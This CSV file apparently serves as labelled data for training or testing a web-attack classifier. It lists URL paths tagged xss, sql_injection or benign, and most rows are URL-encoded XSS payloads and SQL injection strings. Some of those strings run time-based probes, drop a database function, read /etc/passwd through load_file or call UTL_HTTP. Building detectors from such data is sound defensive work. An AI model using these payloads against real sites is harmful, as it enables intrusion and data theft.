text,label
/api/v2/profile?id=%3Cthead+onkeydown%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fthead%3E,xss
/api/v1/comments?text=%3Cdata+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fdata%3E,xss
/api/v1/reviews?body=%3Ccolgroup+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fcolgroup%3E%3Cinput+autofocus%3E,xss
/api/v1/feedback?message=%3Cvar+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fvar%3E,xss
/v1/profile?bio=%3Cnoframes+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fnoframes%3E,xss
/v1/profile?bio=%3Ccode+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fcode%3E,xss
/v1/profile?bio=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cimage+style%3D%22animation-name%3Ax%22+onanimationstart%3D%22alert%281%29%22%3E%3C%2Fimage%3E,xss
/api/v2/comments/%3Ctextarea+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ftextarea%3E,xss
/api/v1/comments?text=%3Cselect+onkeydown%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fselect%3E,xss
/api/v1/search?q=%22%29+or+%28%221%22%3D%221%22%2F%2A,sql_injection
/api/v2/comments/%3Clisting+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Flisting%3E,xss
/api/v2/profile?id=%3Cvideo+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fvideo%3E,xss
/api/v1/reviews?body=%3Ckeygen+draggable%3D%22true%22+ondrag%3D%22alert%281%29%22%3Etest%3C%2Fkeygen%3E,xss
/api/v1/comments?text=%3Ccolgroup+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fcolgroup%3E,xss
/api/v1/feedback?message=%3Cmenu+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fmenu%3E,xss
/api/v1/feedback?message=%3Cinput+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Finput%3E,xss
/v1/products/%27%29+and+0%3Dbenchmark%283000000%2CMD5%281%29%29%2520%2F%2A,sql_injection
/v1/products/or+a%3Da,sql_injection
/api/v1/reviews?body=%3Cbdo+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fbdo%3E%3Cinput+autofocus%3E,xss
/api/v1/comments?text=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Ctemplate+style%3D%22animation-name%3Ax%22+onanimationstart%3D%22alert%281%29%22%3E%3C%2Ftemplate%3E,xss
/v1/projects/proj-4924/databases/(default)/documents/users/alice,benign
/v1/search?q=%3Cpicture+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fpicture%3E,xss
/api/v1/login?username=%3B+execute+immediate+%27sel%27+%7C%7C+%27ect+us%27+%7C%7C+%27er%27&password=pass,sql_injection
/api/v2/profile?id=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cq+style%3D%22animation-name%3Ax%22+onanimationstart%3D%22alert%281%29%22%3E%3C%2Fq%3E,xss
/v1/profile?bio=%3Cwbr+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fwbr%3E,xss
/v1/profile?bio=%3Caddress+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Faddress%3E,xss
/api/v2/items/%27%29+or+%28%271%27%3D%271%27%2F%2A?key=API_KEY,sql_injection
/v1/profile?bio=%3Cspan+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fspan%3E,xss
/api/v1/comments?text=%3Cnextid+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fnextid%3E%3Cinput+autofocus%3E,xss
/api/v2/items/blue+shirt?key=611869,benign
/api/v2/profile?id=%3Ccolgroup+onmouseup%3D%22alert%281%29%22%3Etest%3C%2Fcolgroup%3E,xss
/api/v2/profile?id=%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Col+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22alert%281%29%22%3E%3C%2Fol%3E,xss
/api/v1/reviews?body=%3Col+onmouseup%3D%22alert%281%29%22%3Etest%3C%2Fol%3E,xss
/api/v1/comments?text=%3Cvideo+id%3Dx+controls+onfocusin%3Dalert%281%29%3E%3Csource+src%3D%22validvideo.mp4%22+type%3Dvideo%2Fmp4%3E%3C%2Fvideo%3E,xss
/v1/orders?customer_id=%22%2A%22&status=active,sql_injection
/api/v1/feedback?message=%3Cnav+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fnav%3E,xss
/api/v2/comments/%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Clabel+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Flabel%3E,xss
/api/v2/profile?id=%3Cmeta+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fmeta%3E,xss
/api/v1/reviews?body=%3Crb+draggable%3D%22true%22+ondragend%3D%22alert%281%29%22%3Etest%3C%2Frb%3E,xss
/api/v2/profile?id=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Ctime+style%3D%22animation-name%3Ax%22+onanimationstart%3D%22alert%281%29%22%3E%3C%2Ftime%3E,xss
/v1/orders?customer_id=%252A%2528%257C%2528mail%253D%252A%2529%2529&status=active,sql_injection
/api/v1/reviews?body=%3Ccode+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Fcode%3E,xss
/v1/products/AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2869%29%29%29,sql_injection
/api/v1/reviews?body=%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Cnoframes+id%3Dx+style%3D%22transition%3Acolor+1s%22+ontransitionend%3Dalert%281%29%3E%3C%2Fnoframes%3E,xss
/api/v1/orders?customer_id=801910,benign
/api/v2/profile?id=%3Coptgroup+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Foptgroup%3E,xss
/api/v1/comments?text=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Carea+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Farea%3E,xss
/api/v1/search?q=ORDER+BY+6,sql_injection
/api/v2/profile?id=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Cbgsound+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fbgsound%3E,xss
/api/v1/comments?text=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cp+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Fp%3E,xss
/api/v1/search?q=%27%3D%22or%27,sql_injection
/v1/profile?bio=%3Cscript+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fscript%3E,xss
/v1/profile?bio=%3Csource+draggable%3D%22true%22+ondragstart%3D%22alert%281%29%22%3Etest%3C%2Fsource%3E,xss
/api/v1/feedback?message=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Ctr+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Ftr%3E,xss
/v1/profile?bio=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Ccite+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fcite%3E,xss
/api/v2/profile?id=%3Cmeta+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Fmeta%3E,xss
/api/v2/profile?id=%3Ctbody+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ftbody%3E,xss
/api/v1/reviews?body=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Cmap+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fmap%3E,xss
/v1/products/UNION+ALL+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7,sql_injection
/api/v2/comments/%3Cmarquee+draggable%3D%22true%22+ondragend%3D%22alert%281%29%22%3Etest%3C%2Fmarquee%3E,xss
/api/v1/feedback?message=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Crp+style%3D%22animation-name%3Ax%22+onanimationstart%3D%22alert%281%29%22%3E%3C%2Frp%3E,xss
/api/v1/users?id=26+%25,sql_injection
/api/v1/feedback?message=%3Ctt+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Ftt%3E%3Cinput+autofocus%3E,xss
/api/v2/profile?id=%3Cscript%3E+document.getElementById%28%2522safe123%2522%29.click%3Dfunction%28%29%2B%7Balert%28Safe.get%28%29%29%3B%7D+document.getElementById%28%2522safe123%2522%29.click%28%7B%27type%27%3A%27click%27%2C%27isTrusted%27%3Atrue%7D%29%3B+%3C%2Fscript%3E,xss
/api/v1/reviews?body=%3Cprogress+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Fprogress%3E,xss
/api/v1/feedback?message=%3Cshadow+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fshadow%3E%3Cinput+autofocus%3E,xss
/api/v2/profile?id=%3Ccite+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fcite%3E,xss
/api/v2/comments/%3Cdetails+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fdetails%3E%3Cinput+autofocus%3E,xss
/v1/products/%27+AND+1%3Dutl_inaddr.get_host_address%28%28SELECT+SYS.DATABASE_NAME+FROM+DUAL%29%29+AND+%27i%27%3D%27i,sql_injection
/v1/orders?customer_id=UNION+ALL+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26&status=active,sql_injection
/api/v2/comments/%3Ctbody+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Ftbody%3E,xss
/api/v2/profile?id=%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Csummary+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dalert%281%29%3E%3C%2Fsummary%3E,xss
/v1/search?q=%3Cimage+draggable%3D%22true%22+ondragstart%3D%22alert%281%29%22%3Etest%3C%2Fimage%3E,xss
/api/v1/feedback?message=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Ctt+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Ftt%3E,xss
/api/v2/profile?id=%3Cscript+itworksinallbrowsers%3E%2F%2A%3Cscript%2A+%2A%2Falert%281%29%3C%2Fscript+%3F,xss
/api/v1/reviews?body=%3Celement+onmouseout%3D%22alert%281%29%22%3Etest%3C%2Felement%3E,xss
/api/v1/reviews?body=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Cmark+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fmark%3E,xss
/api/v1/feedback?message=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cp+style%3D%22animation-name%3Ax%22+onanimationstart%3D%22alert%281%29%22%3E%3C%2Fp%3E,xss
/api/v1/search?q=UNION+ALL+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26,sql_injection
/api/v1/reviews?body=%3Cdir+onmousedown%3D%22alert%281%29%22%3Etest%3C%2Fdir%3E,xss
/api/v2/comments/%3Cmarquee+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fmarquee%3E,xss
/api/v1/comments?text=%3Cbdo+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Fbdo%3E,xss
/api/v2/search?q=%27%29%29%29+and+0%3Dbenchmark%283000000%2CMD5%281%29%29%2520%2523&key=API_KEY,sql_injection
/api/v1/comments?text=%3Cdiv+draggable%3D%22true%22+ondrag%3D%22alert%281%29%22%3Etest%3C%2Fdiv%3E,xss
/api/v1/feedback?message=%3Ci+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%3C%2Fi%3E,xss
/api/v2/profile?id=%3Cspacer+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fspacer%3E,xss
/api/v2/comments/%3Cshadow+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fshadow%3E,xss
/api/v1/users?id=%27%7C%7CUTL_HTTP.REQUEST,sql_injection
/api/v1/search?q=675982,benign
/api/v1/reviews?body=%3Cmeter+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Fmeter%3E,xss
/api/v1/feedback?message=%3Cmap+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Fmap%3E,xss
/api/v1/feedback?message=%3Ch1+id%3Dx+tabindex%3D1+ondeactivate%3Dalert%281%29%3E%3C%2Fh1%3E%3Cinput+id%3Dy+autofocus%3E,xss
/api/v1/reviews?body=%3Cbr+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Fbr%3E,xss
/api/v2/items/%29%29+or+sleep%28__TIME__%29%3D%22%22%22?key=API_KEY,sql_injection
/api/v2/profile?id=%3Cbutton+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fbutton%3E,xss
/api/v1/feedback?message=%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Cblockquote+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dalert%281%29%3E%3C%2Fblockquote%3E,xss
/api/v1/login?username=%27+or+0%3D0+%23&password=pass,sql_injection
/api/v1/comments?text=%3Cdiv+id%3D%22125%22%3E%3C%3Fxml+version%3D%221.0%22%3F%3E,xss
/api/v2/comments/%3Cpre+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fpre%3E%3Cinput+autofocus%3E,xss
/api/v1/login?username=IF%287423%3D7424%29+SELECT+7423+ELSE+DROP+FUNCTION+xcjl--&password=pass,sql_injection
/v1/projects/proj-284/databases/(default)/documents/users/admin_test,benign
/v1/search?q=%3Cscript%2Fsrc%3Ddata,xss
/v1/profile?bio=%3Chr+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%3C%2Fhr%3E,xss
/api/v1/reviews?body=%3CSTYLE%3E.XSS%7Bbackground-image%3Aurl%28%22javascript%3Aalert%28%27XSS%27%29%22%29%3B%7D%3C%2FSTYLE%3E%3CA+CLASS%3DXSS%3E%3C%2FA%3E,xss
/api/v2/profile?id=%3Cdatalist+id%3Dx+tabindex%3D1+ondeactivate%3Dalert%281%29%3E%3C%2Fdatalist%3E%3Cinput+id%3Dy+autofocus%3E,xss
/v1/search?q=%3Cbdi+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fbdi%3E%3Cinput+autofocus%3E,xss
/api/v2/search?q=1%C3%A2%E2%82%AC%C2%B2%29+and+%271%C3%A2%E2%82%AC%C2%B2%3D%271%C3%A2%E2%82%AC%E2%80%9C&key=API_KEY,sql_injection
/v1/orders?customer_id=%27%3B+exec+%28%27sel%27+%2B+%27ect+us%27+%2B+%27er%27%29&status=active,sql_injection
/api/v1/feedback?message=%3Cblink+onmousedown%3D%22alert%281%29%22%3Etest%3C%2Fblink%3E,xss
/v1/orders?customer_id=ORDER+BY+1%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29--&status=active,sql_injection
/v1/profile?bio=%3Capplet+draggable%3D%22true%22+ondrag%3D%22alert%281%29%22%3Etest%3C%2Fapplet%3E,xss
/compute/v1/projects/proj-9707/zones/us-central1-a/instances/instance-11004,benign
/api/v1/comments?text=%3Cmap+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Fmap%3E,xss
/api/v2/profile?id=%3Cmark+onmouseout%3D%22alert%281%29%22%3Etest%3C%2Fmark%3E,xss
/v1/orders?customer_id=1%3B%28load_file%28char%2847%2C101%2C116%2C99%2C47%2C112%2C97%2C115%2C115%2C119%2C100%29%29%29%2C1%2C1%2C1%3B&status=active,sql_injection
/api/v1/feedback?message=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cspacer+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fspacer%3E,xss
/api/v2/comments/%3Ctfoot+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Ftfoot%3E,xss
/v1/profile?bio=%3Cheader+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fheader%3E,xss
/api/v1/comments?text=%3Cmenu+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Fmenu%3E,xss
/api/v1/comments?text=%3Cmap+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fmap%3E%3Cinput+autofocus%3E,xss
/api/v1/feedback?message=%3Cvar+id%3Dx+tabindex%3D1+onfocus%3Dalert%281%29%3E%3C%2Fvar%3E,xss
/v1/profile?bio=%3Ciframe+id%3Dx+tabindex%3D1+ondeactivate%3Dalert%281%29%3E%3C%2Fiframe%3E%3Cinput+id%3Dy+autofocus%3E,xss
/api/v1/comments?text=%3Ctd+id%3Dx+tabindex%3D1+ondeactivate%3Dalert%281%29%3E%3C%2Ftd%3E%3Cinput+id%3Dy+autofocus%3E,xss
/api/v1/feedback?message=%3Ctr+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Ftr%3E,xss
/api/v2/comments/%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cul+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Ful%3E,xss
/v1/search?q=%3Cstyle+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%3C%2Fstyle%3E,xss
/api/v1/login?username=%2F%2F%2A&password=pass,sql_injection
/api/v1/login?username=%22%29+and+0%3Dbenchmark%283000000%2CMD5%281%29%29%2520%2523&password=pass,sql_injection
/v1/orders?customer_id=ORDER+BY+1%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%23&status=active,sql_injection
/api/v1/comments?text=%3Csvg%3E%3Cplaintext+onload%3Dalert%281%29%3E%3C%2Fplaintext%3E,xss
/v1/profile?bio=%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Cdatalist+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Fdatalist%3E,xss
/api/v1/users?id=%27%29%2C%28select%2520if%28count%28%2A%29%21%3D-1%2Cbenchmark%283000000%2CMD5%281%29%29%2Cbenchmark%283000000%2CMD5%281%29%29%29%29--,sql_injection
/api/v1/search?q=UNION+ALL+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16,sql_injection
/v1/search?q=%3Cspan+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fspan%3E,xss
/api/v1/comments?text=%3Ctt+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ftt%3E,xss
/api/v1/search?q=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%23,sql_injection
/api/v1/reviews?body=%3Cdata+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fdata%3E,xss
/api/v1/products/86432,benign
/api/v2/profile?id=%3Cbdi+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fbdi%3E,xss
/api/v2/profile?id=%3Ctitle+onmouseup%3D%22alert%281%29%22%3Etest%3C%2Ftitle%3E,xss
/api/v1/feedback?message=%3Csub+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Fsub%3E,xss
/api/v1/feedback?message=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Csection+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fsection%3E,xss
/api/v1/feedback?message=%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Ctitle+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22alert%281%29%22%3E%3C%2Ftitle%3E,xss
/api/v1/feedback?message=%3Crp+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Frp%3E,xss
/api/v2/comments/%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cnoembed+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fnoembed%3E,xss
/api/v1/comments?text=%3Ca+id%3Dx+tabindex%3D1+ondeactivate%3Dalert%281%29%3E%3C%2Fa%3E%3Cinput+id%3Dy+autofocus%3E,xss
/api/v1/feedback?message=%3Cpre+draggable%3D%22true%22+ondragend%3D%22alert%281%29%22%3Etest%3C%2Fpre%3E,xss
/v1/profile?bio=%3Ciframe%2Fonreadystatechange%3Dalert%281%29,xss
/api/v1/reviews?body=%3Cdata+onmousedown%3D%22alert%281%29%22%3Etest%3C%2Fdata%3E,xss
/api/v1/feedback?message=%3Cu+onkeydown%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fu%3E,xss
/api/v1/reviews?body=%3Cscript%2Fsrc%3D%22data,xss
/v1/profile?bio=%3Clink+onclick%3D%22alert%281%29%22%3Etest%3C%2Flink%3E,xss
/api/v1/reviews?body=%3Cblockquote+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fblockquote%3E,xss
/api/v1/feedback?message=%3Cimg+src%3D%22javascript%3Aalert%282%29%22%3E,xss
